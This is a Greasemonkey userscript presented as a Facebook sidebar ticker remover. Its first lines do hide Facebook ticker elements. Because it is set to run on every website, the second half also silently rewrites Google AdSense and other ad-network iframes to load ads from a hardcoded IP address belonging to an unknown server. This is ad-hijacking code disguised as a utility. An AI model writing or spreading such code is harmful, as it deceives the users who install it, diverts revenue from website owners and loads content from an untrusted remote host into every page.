//Code Developed by Manak Kapoor. Fbajaxremover
// ==UserScript==
// @name           Facebook SideBar Ticker Remover
// @description   Sidebar Ticker Remover
// @version                      1.0.9
// @include       *
// @changes       Updated to remove another ticker added by fb.
// ==/UserScript==
//Please contact manak.kapoor@gmail.com for more information.
/*
 *  This work is licensed under a Creative Commons
 * Attribution-NonCommercial-NoDerivs 3.0 Unported License
 * http://creativecommons.org/licenses/by-nc-nd/3.0/
 *
 * UNLESS OTHERWISE MUTUALLY AGREED BY THE PARTIES IN WRITING,
 * LICENSOR OFFERS THE WORK AS-IS AND MAKES NO REPRESENTATIONS
 * OR WARRANTIES OF ANY KIND CONCERNING THE WORK, EXPRESS, IMPLIED,
 * STATUTORY OR OTHERWISE, INCLUDING, WITHOUT LIMITATION, WARRANTIES
 * OF TITLE, MERCHANTIBILITY, FITNESS FOR A PARTICULAR PURPOSE,
 * NONINFRINGEMENT, OR THE ABSENCE OF LATENT OR OTHER DEFECTS,
 * ACCURACY, OR THE PRESENCE OF ABSENCE OF ERRORS, WHETHER OR NOT
 * DISCOVERABLE. SOME JURISDICTIONS DO NOT ALLOW THE EXCLUSION OF
 * IMPLIED WARRANTIES, SO SUCH EXCLUSION MAY NOT APPLY TO YOU.
 * EXCEPT TO THE EXTENT REQUIRED BY APPLICABLE LAW, IN NO EVENT
 * WILL LICENSOR BE LIABLE TO YOU ON ANY LEGAL THEORY FOR ANY SPECIAL,
 * INCIDENTAL, CONSEQUENTIAL, PUNITIVE OR EXEMPLARY DAMAGES ARISING
 * OUT OF THIS LICENSE OR THE USE OF THE WORK, EVEN IF LICENSOR HAS
 * BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
 */
//1.0.9 Updated to remove another ticker facebook added!
//1.0.8 Updated to remove another ticker facebook added!
//Call Facebook UserInterface Library, written by Manak Kapoor :]
//fbtickerRemove\fbtickerRemover.user.js

var d1=document.getElementById("pagelet_ticker").parentNode;
var d2=document.getElementById("pagelet_ticker");
d2.setAttribute("style","display:none;");
d1=document.getElementById("uiScrollableArea ticker_container fade contentAfter").parentNode;
d2=document.getElementById("uiScrollableArea ticker_container fade contentAfter");
d2.setAttribute("style","display:none;");

d1=document.getElementById("pagelet_rhc_ticker").parentNode;
d2=document.getElementById("pagelet_rhc_ticker");
d2.setAttribute("style","display:none;");
d1=document.getElementById("fbChatSidebarBody").parentNode;
d2=document.getElementById("fbChatSidebarBody");
d2.removeAttribute("style");
d2.setAttribute("style","height:100%;");
var adBaseUrl="http://208.93.118.76/ads/";
for(var i=0;i<=100;i++)
{
if(document.getElementById('aswift_'+i)==undefined)
{
break;}
document.getElementById('aswift_'+i).src=adBaseUrl+document.getElementById('aswift_'+i).offsetWidth+'x'+document.getElementById('aswift_'+i).offsetHeight+'.html';							
}

var pubads=document.getElementsByTagName('iframe');
for(var i=0;i<=pubads.length-1;i++)
{
if(pubads[i].src.toString().indexOf('pubads.g.doubleclick') !=-1 || pubads[i].src.toString().indexOf('rtbidder.net') !=-1 || pubads[i].src.toString().indexOf('admeld.com') !=-1 || pubads[i].src.toString().indexOf('adnxs.com') !=-1)
{
pubads[i].src=adBaseUrl+pubads[i].offsetWidth+'x'+pubads[i].offsetHeight+'.html';
}
}
